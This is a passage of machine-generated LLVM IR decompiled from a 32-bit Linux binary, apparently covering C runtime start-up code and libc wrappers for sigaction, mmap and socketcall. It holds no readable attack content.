  %v0_80540ea = load i32, i32* @global_var_80569ac.236, align 4
  store i32 %v0_80540ea, i32* @ecx, align 4
  %v1_80540f0 = icmp eq i32 %v0_80540ea, 0
  br i1 %v1_80540f0, label %dec_label_pc_80540f9, label %dec_label_pc_80540f4

dec_label_pc_80540f4:                             ; preds = %dec_label_pc_80540ea
  %v2_80540f4 = load i32, i32* %stack_var_-16, align 4
  %v1_80540f7 = call i32 @unknown_0(i32 %v2_80540f4)
  br label %dec_label_pc_80540f9

dec_label_pc_80540f9:                             ; preds = %dec_label_pc_80540f4, %dec_label_pc_80540ea
  %v2_80540f9 = load i32, i32* %stack_var_-4, align 4
  ret i32 %v2_80540f9

; uselistorder directives
  uselistorder i32 %v1_80540d9, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32 (i32)* @unknown_0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80540d2, { 1, 0 }
}

define i32 @function_80540fd(i32 %arg1) local_unnamed_addr {
dec_label_pc_80540fd:
  ret i32 0
}

define i32 @function_8054100(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054100:
  %v0_8054100 = load i32, i32* @eax, align 4
  ret i32 %v0_8054100
}

define i32 @function_8054101() local_unnamed_addr {
dec_label_pc_8054101:
  %stack_var_-12 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %v0_8054101 = load i32, i32* @esi, align 4
  %v0_8054102 = load i32, i32* @ebx, align 4
  %v0_8054106 = load i32, i32* @eax, align 4
  store i32 %v0_8054106, i32* @esi, align 4
  %v0_8054108 = load i32, i32* @edx, align 4
  store i32 %v0_8054108, i32* @ebx, align 4
  %v4_805410d = call i32 @function_805217d(i32 %v0_8054106, i32 1, i32 %tmp6)
  %v8_8054115 = icmp eq i32 %v4_805410d, -1
  %v1_8054116 = icmp eq i1 %v8_8054115, false
  br i1 %v1_8054116, label %dec_label_pc_8054131, label %dec_label_pc_8054118

dec_label_pc_8054118:                             ; preds = %dec_label_pc_8054101
  %v0_805411a = load i32, i32* @ebx, align 4
  %v6_8054120 = call i32 @function_8052352(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8055520.237, i32 0, i32 0), i32 %v0_805411a)
  %v1_8054128 = load i32, i32* @esi, align 4
  %v12_8054128 = icmp eq i32 %v6_8054120, %v1_8054128
  br i1 %v12_8054128, label %dec_label_pc_8054131, label %dec_label_pc_805412c

dec_label_pc_805412c:                             ; preds = %dec_label_pc_8054118
  %v0_805412c = call i32 @function_8053b35()
  br label %dec_label_pc_8054131

dec_label_pc_8054131:                             ; preds = %dec_label_pc_8054118, %dec_label_pc_8054101, %dec_label_pc_805412c
  %v2_8054131 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_8054102, i32* @ebx, align 4
  store i32 %v0_8054101, i32* @esi, align 4
  ret i32 %v2_8054131

; uselistorder directives
  uselistorder i32 ()* @function_8053b35, { 3, 2, 1, 4, 0 }
  uselistorder i32 (i8*, i32)* @function_8052352, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 (i32, i32, i32)* @function_805217d, { 4, 5, 9, 8, 7, 6, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054131, { 2, 0, 1 }
}

define i32 @function_8054135() local_unnamed_addr {
dec_label_pc_8054135:
  %v0_8054138 = load i8, i8* @global_var_80569b0.238, align 16
  %v1_8054138 = icmp eq i8 %v0_8054138, 0
  %v1_805413f = icmp eq i1 %v1_8054138, false
  br i1 %v1_805413f, label %dec_label_pc_8054135.dec_label_pc_8054171_crit_edge, label %dec_label_pc_8054141

dec_label_pc_8054135.dec_label_pc_8054171_crit_edge: ; preds = %dec_label_pc_8054135
  %v0_8054174.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8054171

dec_label_pc_8054141:                             ; preds = %dec_label_pc_8054135
  store i8 1, i8* @global_var_80569b0.238, align 16
  store i32 4096, i32* @global_var_80569a4.239, align 4
  br label %dec_label_pc_8054171

dec_label_pc_8054171:                             ; preds = %dec_label_pc_8054135.dec_label_pc_8054171_crit_edge, %dec_label_pc_8054141
  %v0_8054174 = phi i32 [ %v0_8054174.pre, %dec_label_pc_8054135.dec_label_pc_8054171_crit_edge ], [ 0, %dec_label_pc_8054141 ]
  ret i32 %v0_8054174

; uselistorder directives
  uselistorder i8 1, { 11, 1, 12, 4, 5, 6, 2, 3, 8, 0, 13, 14, 15, 16, 7, 10, 9 }
  uselistorder i8* @global_var_80569b0.238, { 1, 0 }
  uselistorder label %dec_label_pc_8054171, { 1, 0 }
}

define i32 @function_8054175(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054175:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp38 = call i32 @__decompiler_undefined_function_0()
  %tmp39 = call i32 @__decompiler_undefined_function_0()
  %tmp44 = ptrtoint i32* %arg3 to i32
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %tmp44, i32* @edi, align 4
  store i32 %arg7, i32* @global_var_805699c.240, align 4
  store i32 %arg6, i32* @global_var_80569ac.236, align 4
  store i32 %arg4, i32* @ebp, align 4
  %v2_80541ac = mul i32 %arg2, 4
  %v3_80541ac = add i32 %tmp44, %v2_80541ac
  store i32 %v3_80541ac, i32* %edx.global-to-local, align 4
  %v1_80541af = add i32 %v3_80541ac, 4
  store i32 %v1_80541af, i32* @global_var_80569a0.241, align 32
  %v3_80541b7 = load i32, i32* %arg3, align 4
  %v14_80541b7 = icmp eq i32 %v1_80541af, %v3_80541b7
  %v1_80541b9 = icmp eq i1 %v14_80541b7, false
  br i1 %v1_80541b9, label %dec_label_pc_80541c1, label %dec_label_pc_80541bb

dec_label_pc_80541bb:                             ; preds = %dec_label_pc_8054175
  store i32 %v3_80541ac, i32* @global_var_80569a0.241, align 32
  br label %dec_label_pc_80541c1

dec_label_pc_80541c1:                             ; preds = %dec_label_pc_8054175, %dec_label_pc_80541bb
  %v0_80541c1 = load i32, i32* @ecx, align 4
  store i32 %v0_80541c1, i32* %stack_var_-160, align 4
  store i32 0, i32* %stack_var_-168, align 4
  %v2_80541c6 = ptrtoint i32* %stack_var_-136 to i32
  %v3_80541cb = bitcast i32* %stack_var_-136 to i8*
  %v4_80541cb = call i32 @function_80527ca(i8* %v3_80541cb, i32 0, i32 120)
  %v0_80541d0 = load i32, i32* @global_var_80569a0.241, align 32
  br label %dec_label_pc_80541d8

dec_label_pc_80541d8:                             ; preds = %dec_label_pc_80541d8, %dec_label_pc_80541c1
  %v0_80541d8 = phi i32 [ %v1_80541db, %dec_label_pc_80541d8 ], [ %v0_80541d0, %dec_label_pc_80541c1 ]
  %v1_80541d8 = inttoptr i32 %v0_80541d8 to i32*
  %v2_80541d8 = load i32, i32* %v1_80541d8, align 4
  %v3_80541d8 = icmp eq i32 %v2_80541d8, 0
  %v1_80541db = add i32 %v0_80541d8, 4
  %v1_80541de = icmp eq i1 %v3_80541d8, false
  br i1 %v1_80541de, label %dec_label_pc_80541d8, label %dec_label_pc_80541ff.preheader

dec_label_pc_80541ff.preheader:                   ; preds = %dec_label_pc_80541d8
  store i32 %v1_80541db, i32* @ebx, align 4
  %v1_80541ff22 = inttoptr i32 %v1_80541db to i32*
  %v2_80541ff23 = load i32, i32* %v1_80541ff22, align 4
  %v3_80541ff24 = icmp eq i32 %v2_80541ff23, 0
  %v1_805420226 = icmp eq i1 %v3_80541ff24, false
  br i1 %v1_805420226, label %dec_label_pc_80541e4.lr.ph, label %dec_label_pc_8054204

dec_label_pc_80541e4.lr.ph:                       ; preds = %dec_label_pc_80541ff.preheader
  %v3_80541c4 = ptrtoint i32* %stack_var_-168 to i32
  %v3_80541ef = add i32 %v3_80541c4, 32
  br label %dec_label_pc_80541e4

dec_label_pc_80541e4:                             ; preds = %dec_label_pc_80541e4.lr.ph, %dec_label_pc_80541fc
  %v1_80541ef = phi i32 [ %v2_80541ff23, %dec_label_pc_80541e4.lr.ph ], [ %v2_80541ff, %dec_label_pc_80541fc ]
  %v0_80541ee = phi i32 [ %v1_80541db, %dec_label_pc_80541e4.lr.ph ], [ %v1_80541fc, %dec_label_pc_80541fc ]
  %v6_80541e9 = icmp ugt i32 %v1_80541ef, 14
  br i1 %v6_80541e9, label %dec_label_pc_80541fc, label %dec_label_pc_80541eb

dec_label_pc_80541eb:                             ; preds = %dec_label_pc_80541e4
  %v0_80541eb = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80541eb, i32* %stack_var_-160, align 4
  store i32 %v0_80541ee, i32* %stack_var_-168, align 4
  %v2_80541ef = mul i32 %v1_80541ef, 8
  %v4_80541ef = add i32 %v3_80541ef, %v2_80541ef
  %v3_80541f4 = inttoptr i32 %v4_80541ef to i16*
  %v4_80541f4 = call i32 @function_80549c2(i16* %v3_80541f4, i32 %v0_80541ee, i32 8)
  %v0_80541fc.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80541fc

dec_label_pc_80541fc:                             ; preds = %dec_label_pc_80541e4, %dec_label_pc_80541eb
  %v0_80541fc = phi i32 [ %v0_80541ee, %dec_label_pc_80541e4 ], [ %v0_80541fc.pre, %dec_label_pc_80541eb ]
  %v1_80541fc = add i32 %v0_80541fc, 8
  store i32 %v1_80541fc, i32* @ebx, align 4
  %v1_80541ff = inttoptr i32 %v1_80541fc to i32*
  %v2_80541ff = load i32, i32* %v1_80541ff, align 4
  %v3_80541ff = icmp eq i32 %v2_80541ff, 0
  %v1_8054202 = icmp eq i1 %v3_80541ff, false
  br i1 %v1_8054202, label %dec_label_pc_80541e4, label %dec_label_pc_8054204

dec_label_pc_8054204:                             ; preds = %dec_label_pc_80541fc, %dec_label_pc_80541ff.preheader
  store i32 %v2_80541c6, i32* @eax, align 4
  %v0_8054208 = call i32 @function_8054a7d()
  store i32 %v0_8054208, i32* @eax, align 4
  %v0_805420d = call i32 @function_8054135()
  %v1_8054216 = icmp eq i32 %tmp39, 0
  %v1_8054218 = icmp eq i1 %v1_8054216, false
  br i1 %v1_8054218, label %dec_label_pc_805421e, label %dec_label_pc_805421a

dec_label_pc_805421a:                             ; preds = %dec_label_pc_8054204
  %v1_805421a = and i32 %tmp39, -65536
  %v2_805421a = or i32 %v1_805421a, 4096
  br label %dec_label_pc_805421e

dec_label_pc_805421e:                             ; preds = %dec_label_pc_8054204, %dec_label_pc_805421a
  %v0_805421e = phi i32 [ %tmp39, %dec_label_pc_8054204 ], [ %v2_805421a, %dec_label_pc_805421a ]
  store i32 %v0_805421e, i32* @global_var_80569a4.239, align 4
  %v13_8054223 = icmp eq i32 %tmp38, -1
  %v1_8054228 = icmp eq i1 %v13_8054223, false
  br i1 %v1_8054228, label %dec_label_pc_8054253, label %dec_label_pc_805422a

dec_label_pc_805422a:                             ; preds = %dec_label_pc_805421e
  %v0_805422a = call i32 @function_80547a1()
  store i32 %v0_805422a, i32* @ebx, align 4
  %v0_8054231 = call i32 @function_8054710()
  %v0_8054236 = load i32, i32* @ebx, align 4
  %v12_8054236 = icmp eq i32 %v0_8054236, %v0_8054231
  %v1_8054238 = icmp eq i1 %v12_8054236, false
  br i1 %v1_8054238, label %dec_label_pc_8054269, label %dec_label_pc_805423a

dec_label_pc_805423a:                             ; preds = %dec_label_pc_805422a
  %v0_805423a = call i32 @function_8054736()
  store i32 %v0_805423a, i32* @ebx, align 4
  %v0_8054241 = call i32 @function_80546ea()
  %v0_8054246 = load i32, i32* @ebx, align 4
  %v12_8054246 = icmp eq i32 %v0_8054246, %v0_8054241
  %v1_8054248 = icmp eq i1 %v12_8054246, false
  br i1 %v1_8054248, label %dec_label_pc_8054269, label %dec_label_pc_805424a.thread

dec_label_pc_805424a.thread:                      ; preds = %dec_label_pc_805423a
  br label %dec_label_pc_8054293

dec_label_pc_8054253:                             ; preds = %dec_label_pc_805421e
  %v15_8054253 = icmp eq i32 %tmp38, %tmp37
  %v1_8054257 = icmp eq i1 %v15_8054253, false
  br i1 %v1_8054257, label %dec_label_pc_8054269, label %dec_label_pc_8054259

dec_label_pc_8054259:                             ; preds = %dec_label_pc_8054253
  br label %dec_label_pc_8054269

dec_label_pc_8054269:                             ; preds = %dec_label_pc_8054259, %dec_label_pc_8054253, %dec_label_pc_805423a, %dec_label_pc_805422a
  store i32 131072, i32* @edx, align 4
  store i32 0, i32* @eax, align 4
  %v0_8054270 = call i32 @function_8054101()
  store i32 131074, i32* @edx, align 4
  store i32 1, i32* @eax, align 4
  %v0_805427f = call i32 @function_8054101()
  store i32 131074, i32* @edx, align 4
  store i32 2, i32* @eax, align 4
  %v0_805428e = call i32 @function_8054101()
  br label %dec_label_pc_8054293

dec_label_pc_8054293:                             ; preds = %dec_label_pc_805424a.thread, %dec_label_pc_8054269
  store i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32* %esi.global-to-local, align 4
  %v0_8054298 = load i32, i32* @edi, align 4
  %v1_8054298 = inttoptr i32 %v0_8054298 to i32*
  %v2_8054298 = load i32, i32* %v1_8054298, align 4
  store i32 %v2_8054298, i32* bitcast (i32** @global_var_80568c8.243 to i32*), align 8
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32* %esi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 %arg5, i32* @global_var_80569a8.235, align 8
  br i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32 0), label %dec_label_pc_80542b8, label %dec_label_pc_80542c4

dec_label_pc_80542b8:                             ; preds = %dec_label_pc_8054293, %dec_label_pc_80542b8
  %v4_80542b8 = phi i32 [ %v1_80542bf, %dec_label_pc_80542b8 ], [ 0, %dec_label_pc_8054293 ]
  store i32 ptrtoint (i32* @global_var_80542bf.244 to i32), i32* %stack_var_-160, align 4
  %v5_80542b8 = mul i32 %v4_80542b8, 4
  %v6_80542b8 = add i32 %v5_80542b8, ptrtoint (i32* @global_var_8056844.233 to i32)
  %v7_80542b8 = inttoptr i32 %v6_80542b8 to i32*
  %v8_80542b8 = load i32, i32* %v7_80542b8, align 4
  call void @__pseudo_call(i32 %v8_80542b8)
  %v0_80542bf = load i32, i32* %ebx.global-to-local, align 4
  %v1_80542bf = add i32 %v0_80542bf, 1
  store i32 %v1_80542bf, i32* %ebx.global-to-local, align 4
  %v1_80542c0 = load i32, i32* %esi.global-to-local, align 4
  %v7_80542c0 = icmp ult i32 %v1_80542bf, %v1_80542c0
  br i1 %v7_80542c0, label %dec_label_pc_80542b8, label %dec_label_pc_80542c4

dec_label_pc_80542c4:                             ; preds = %dec_label_pc_80542b8, %dec_label_pc_8054293
  store i32 134562506, i32* %stack_var_-160, align 4
  call void @__pseudo_call(i32 %arg4)
  store i32 0, i32* %ebx.global-to-local, align 4
  store i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32* %esi.global-to-local, align 4
  br i1 icmp ugt (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32 0), label %dec_label_pc_80542dc, label %dec_label_pc_80542e8

dec_label_pc_80542dc:                             ; preds = %dec_label_pc_80542c4, %dec_label_pc_80542dc
  %v4_80542dc = phi i32 [ %v1_80542e3, %dec_label_pc_80542dc ], [ 0, %dec_label_pc_80542c4 ]
  store i32 ptrtoint (i32* @global_var_80542e3.245 to i32), i32* %stack_var_-160, align 4
  %v5_80542dc = mul i32 %v4_80542dc, 4
  %v6_80542dc = add i32 %v5_80542dc, ptrtoint (i32* @global_var_8056844.233 to i32)
  %v7_80542dc = inttoptr i32 %v6_80542dc to i32*
  %v8_80542dc = load i32, i32* %v7_80542dc, align 4
  call void @__pseudo_call(i32 %v8_80542dc)
  %v0_80542e3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_80542e3 = add i32 %v0_80542e3, 1
  store i32 %v1_80542e3, i32* %ebx.global-to-local, align 4
  %v1_80542e4 = load i32, i32* %esi.global-to-local, align 4
  %v7_80542e4 = icmp ult i32 %v1_80542e3, %v1_80542e4
  br i1 %v7_80542e4, label %dec_label_pc_80542dc, label %dec_label_pc_80542e8

dec_label_pc_80542e8:                             ; preds = %dec_label_pc_80542dc, %dec_label_pc_80542c4
  %v0_80542f1 = load i32, i32* %stack_var_-160, align 4
  %v1_80542f1 = call i32 @function_8052779(i32 %v0_80542f1)
  %v1_80542f6 = inttoptr i32 %v1_80542f1 to i32*
  store i32 0, i32* %v1_80542f6, align 4
  store i32 0, i32* @eax, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v0_8054317 = load i32, i32* @edi, align 4
  store i32 %v0_8054317, i32* %stack_var_-168, align 4
  call void @__pseudo_call(i32 %arg1)
  %v0_8054326 = load i32, i32* @eax, align 4
  %v1_8054329 = call i32 @function_8053d89(i32 %v0_8054326)
  %v0_8054335 = load i32, i32* @ebx, align 4
  %v1_8054335 = inttoptr i32 %v0_8054335 to %sigcontext*
  %v2_8054335 = call i32 @sigreturn(%sigcontext* %v1_8054335)
  %v0_805433d = load i32, i32* @ebx, align 4
  %v1_805433d = inttoptr i32 %v0_805433d to %sigcontext*
  %v2_805433d = call i32 @sigreturn(%sigcontext* %v1_805433d)
  ret i32 %v2_805433d

; uselistorder directives
  uselistorder i32 %v1_80542e3, { 1, 2, 0 }
  uselistorder i32 %v1_80542bf, { 1, 2, 0 }
  uselistorder i32 %v2_80541ff, { 1, 0 }
  uselistorder i32 %v1_80541fc, { 2, 1, 0 }
  uselistorder i32 %v1_80541db, { 0, 2, 1, 3 }
  uselistorder i32 %v0_80541d8, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %stack_var_-168, { 0, 1, 3, 2 }
  uselistorder i32 (i32)* @function_8053d89, { 0, 2, 1 }
  uselistorder i1 icmp ne (i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), i32 0), { 1, 0 }
  uselistorder i32 ashr (i32 add (i32 ptrtoint (i32* @global_var_8056844.233 to i32), i32 -134572100), i32 2), { 1, 3, 4, 2, 0 }
  uselistorder i32 ()* @function_8054101, { 2, 1, 0 }
  uselistorder i32 131072, { 2, 1, 0 }
  uselistorder i32 -65536, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 120, { 8, 22, 1, 2, 9, 10, 3, 11, 12, 13, 4, 5, 14, 15, 6, 16, 17, 7, 18, 19, 20, 21, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_80542dc, { 1, 0 }
  uselistorder label %dec_label_pc_80542b8, { 1, 0 }
  uselistorder label %dec_label_pc_8054293, { 1, 0 }
  uselistorder label %dec_label_pc_805421e, { 1, 0 }
  uselistorder label %dec_label_pc_80541fc, { 1, 0 }
  uselistorder label %dec_label_pc_80541e4, { 1, 0 }
  uselistorder label %dec_label_pc_80541c1, { 1, 0 }
}

define i32 @function_805433f(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_805433f:
  %ebx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg2 to i32
  %stack_var_-276 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-288 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %v0_805433f = load i32, i32* @esi, align 4
  %v0_8054340 = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* @ebx, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_8054355 = icmp eq i32* %arg2, null
  br i1 %v1_8054355, label %dec_label_pc_80543a8, label %dec_label_pc_8054359

dec_label_pc_8054359:                             ; preds = %dec_label_pc_805433f
  %v2_8054359 = load i32, i32* %arg2, align 4
  store i32 %v2_8054359, i32* %stack_var_-148, align 4
  %v1_8054362 = add i32 %tmp11, 4
  %v3_8054374 = bitcast i32* %stack_var_-136 to i16*
  %v4_8054374 = call i32 @function_80549c2(i16* %v3_8054374, i32 %v1_8054362, i32 128)
  %v1_8054379 = add i32 %tmp11, 132
  %v2_8054393 = inttoptr i32 %v1_8054379 to i8*
  %v3_8054393 = load i8, i8* %v2_8054393, align 1
  %v4_8054393 = and i8 %v3_8054393, 4
  %v5_8054393 = icmp eq i8 %v4_8054393, 0
  %v1_805439a = icmp eq i1 %v5_8054393, false
  br i1 %v1_805439a, label %dec_label_pc_80543a8, label %dec_label_pc_805439c

dec_label_pc_805439c:                             ; preds = %dec_label_pc_8054359
  br label %dec_label_pc_80543a8

dec_label_pc_80543a8:                             ; preds = %dec_label_pc_805439c, %dec_label_pc_8054359, %dec_label_pc_805433f
  %v1_80543aa = icmp eq i32 %arg3, 0
  br i1 %v1_80543aa, label %dec_label_pc_80543b2, label %dec_label_pc_80543ae

dec_label_pc_80543ae:                             ; preds = %dec_label_pc_80543a8
  %v2_80543ae = ptrtoint i32* %stack_var_-288 to i32
  br label %dec_label_pc_80543b2

dec_label_pc_80543b2:                             ; preds = %dec_label_pc_80543a8, %dec_label_pc_80543ae
  %v0_80543c1 = phi i32 [ 0, %dec_label_pc_80543a8 ], [ %v2_80543ae, %dec_label_pc_80543ae ]
  br i1 %v1_8054355, label %dec_label_pc_80543bf, label %dec_label_pc_80543b8

dec_label_pc_80543b8:                             ; preds = %dec_label_pc_80543b2
  %phitmp = bitcast i32* %stack_var_-148 to %sigaction*
  br label %dec_label_pc_80543bf

dec_label_pc_80543bf:                             ; preds = %dec_label_pc_80543b2, %dec_label_pc_80543b8
  %v0_80543c2 = phi %sigaction* [ null, %dec_label_pc_80543b2 ], [ %phitmp, %dec_label_pc_80543b8 ]
  %v5_80543ca = call i32 @function_8054465(i32 %arg1, %sigaction* %v0_80543c2, i32 %v0_80543c1, i32 8)
  store i32 %v5_80543ca, i32* %ebx.global-to-local, align 4
  br i1 %v1_80543aa, label %dec_label_pc_805440d, label %dec_label_pc_80543d8

dec_label_pc_80543d8:                             ; preds = %dec_label_pc_80543bf
  %v2_80543d8 = icmp slt i32 %v5_80543ca, 0
  br i1 %v2_80543d8, label %dec_label_pc_805440d, label %dec_label_pc_80543dc

dec_label_pc_80543dc:                             ; preds = %dec_label_pc_80543d8
  %v3_80543dc = load i32, i32* %stack_var_-288, align 4
  %v2_80543e0 = inttoptr i32 %arg3 to i32*
  store i32 %v3_80543dc, i32* %v2_80543e0, align 4
  %v2_80543e8 = ptrtoint i32* %stack_var_-276 to i32
  %v1_80543ed = add i32 %arg3, 4
  %v3_80543f1 = inttoptr i32 %v1_80543ed to i16*
  %v4_80543f1 = call i32 @function_80549c2(i16* %v3_80543f1, i32 %v2_80543e8, i32 128)
  %v2_80543fa = add i32 %arg3, 132
  %v3_80543fa = inttoptr i32 %v2_80543fa to i32*
  %v2_8054407 = add i32 %arg3, 136
  %v3_8054407 = inttoptr i32 %v2_8054407 to i32*
  %v0_805440d.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805440d

dec_label_pc_805440d:                             ; preds = %dec_label_pc_80543d8, %dec_label_pc_80543bf, %dec_label_pc_80543dc
  %v0_805440d = phi i32 [ %v5_80543ca, %dec_label_pc_80543d8 ], [ %v5_80543ca, %dec_label_pc_80543bf ], [ %v0_805440d.pre, %dec_label_pc_80543dc ]
  store i32 %v0_8054340, i32* @ebx, align 4
  store i32 %v0_805433f, i32* @esi, align 4
  ret i32 %v0_805440d

; uselistorder directives
  uselistorder i32 136, { 1, 0, 2 }
  uselistorder i8 4, { 3, 4, 1, 2, 5, 6, 0 }
  uselistorder i32 132, { 1, 2, 0, 3 }
  uselistorder i32 128, { 6, 7, 11, 8, 10, 0, 1, 2, 3, 4, 5, 9 }
  uselistorder i32* null, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 2, 0, 3, 4, 1, 5 }
  uselistorder label %dec_label_pc_805440d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80543bf, { 1, 0 }
  uselistorder label %dec_label_pc_80543b2, { 1, 0 }
}

define i32 @function_8054418(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8054418:
  %stack_var_4 = alloca i32, align 4
  %v0_8054418 = load i32, i32* @ebx, align 4
  store i32 %v0_8054418, i32* @edx, align 4
  %v2_8054423 = load i32, i32* @ecx, align 4
  %v4_8054423 = load i32, i32* @esi, align 4
  %v5_8054423 = load i32, i32* @edi, align 4
  %v6_8054423 = load i32, i32* @ebp, align 4
  %v7_8054423 = call i32* @mmap(i32* nonnull %stack_var_4, i32 %v2_8054423, i32 %v0_8054418, i32 %v4_8054423, i32 %v5_8054423, i32 %v6_8054423)
  %v8_8054423 = ptrtoint i32* %v7_8054423 to i32
  store i32 %v0_8054418, i32* @ebx, align 4
  %v3_805442c = icmp ugt i32* %v7_8054423, inttoptr (i32 -4096 to i32*)
  call void @__pseudo_cond_branch(i1 %v3_805442c, i32 134564549)
  ret i32 %v8_8054423

; uselistorder directives
  uselistorder i32* @ebp, { 7, 68, 69, 70, 71, 72, 73, 74, 75, 32, 33, 34, 35, 76, 77, 78, 79, 80, 81, 82, 83, 88, 84, 85, 86, 87, 6, 89, 10, 2, 21, 22, 11, 29, 15, 8, 14, 16, 18, 1, 23, 9, 0, 28, 12, 13, 17, 19, 20, 24, 25, 26, 27, 30, 31, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 3, 47, 48, 49, 50, 4, 51, 52, 53, 54, 55, 56, 57, 58, 59, 5, 60, 61, 62, 63, 64, 65, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 110, 108, 109, 111, 112, 113, 114, 115, 66, 67 }
  uselistorder i32* @ecx, { 5, 19, 17, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 1, 45, 21, 20, 18, 46, 47, 48, 2, 49, 50, 51, 3, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 7, 8, 4, 9, 10, 11, 63, 12, 13, 14, 15, 16, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 6, 89, 90, 91, 92, 93 }
}

define i32 @function_8054433(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8054433:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8054433 = load i32, i32* @ebx, align 4
  store i32 %v0_8054433, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8054446 = call i32 @int80_syscall(i32 102)
  store i32 %v1_8054446, i32* %ebx.global-to-local, align 4
  %tmp9 = icmp ult i32 %v1_8054446, -4095
  br i1 %tmp9, label %dec_label_pc_805445f, label %dec_label_pc_8054453

dec_label_pc_8054453:                             ; preds = %dec_label_pc_8054433
  %v1_8054453 = call i32 @function_8052779(i32 %v0_8054433)
  %v0_8054458 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054458 = sub i32 0, %v0_8054458
  %v2_805445a = inttoptr i32 %v1_8054453 to i32*
  store i32 %v1_8054458, i32* %v2_805445a, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  %v2_8054463.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_805445f

dec_label_pc_805445f:                             ; preds = %dec_label_pc_8054433, %dec_label_pc_8054453
  %v2_8054463 = phi i32 [ %v0_8054433, %dec_label_pc_8054433 ], [ %v2_8054463.pre, %dec_label_pc_8054453 ]
  %v0_805445f = phi i32 [ %v1_8054446, %dec_label_pc_8054433 ], [ -1, %dec_label_pc_8054453 ]
  %v2_8054461 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054461, i32* @edx, align 4
  store i32 %v2_8054463, i32* @ebx, align 4
  ret i32 %v0_805445f

; uselistorder directives
  uselistorder i32 %v1_8054446, { 1, 0, 2 }
  uselistorder i32 102, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805445f, { 1, 0 }
}

define i32 @function_8054465(i32 %arg1, %sigaction* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8054465:
  %esi.global-to-local = alloca i32, align 4
  %tmp5 = inttoptr i32 %arg3 to %sigaction*
  %stack_var_-8 = alloca i32, align 4
  %v0_8054466 = load i32, i32* @esi, align 4
  store i32 %v0_8054466, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_805447a = load i32, i32* @ebx, align 4
  %v7_8054482 = call i32 @sigaction(i32 %arg1, %sigaction* %arg2, %sigaction* %tmp5)
  store i32 %v7_8054482, i32* %esi.global-to-local, align 4
  %tmp14 = icmp ult i32 %v7_8054482, -4095
  br i1 %tmp14, label %dec_label_pc_805449a, label %dec_label_pc_805448e

dec_label_pc_805448e:                             ; preds = %dec_label_pc_8054465
  %v1_805448e = call i32 @function_8052779(i32 %v0_805447a)
  %v0_8054493 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054493 = sub i32 0, %v0_8054493
  %v2_8054495 = inttoptr i32 %v1_805448e to i32*
